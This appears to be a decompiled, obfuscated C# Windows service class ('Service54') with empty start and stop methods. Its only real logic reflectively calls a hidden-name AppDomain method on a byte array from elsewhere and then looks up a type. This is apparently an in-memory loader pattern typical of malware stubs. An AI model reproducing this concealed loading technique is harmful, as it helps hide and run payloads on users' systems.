using System;
using System.ComponentModel;
using System.ServiceProcess;

namespace ns0;

internal sealed class Class50 : ServiceBase
{
	internal static string string_0 = Class47.string_0;

	internal IContainer icontainer_0;

	public Class50()
	{
		method_0();
	}

	protected override void OnStart(string[] args)
	{
	}

	protected override void OnStop()
	{
	}

	internal static Type smethod_0()
	{
		return ((Class1.Delegate0)Delegate.CreateDelegate(typeof(Class1.Delegate0), AppDomain.CurrentDomain, typeof(AppDomain).GetMethod(string_0, new Type[1] { typeof(byte[]) })))(Class19.smethod_0()).GetType(Class6.string_0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void method_0()
	{
		IContainer container = (icontainer_0 = new Container());
		((ServiceBase)this).set_ServiceName("Service54");
	}
}
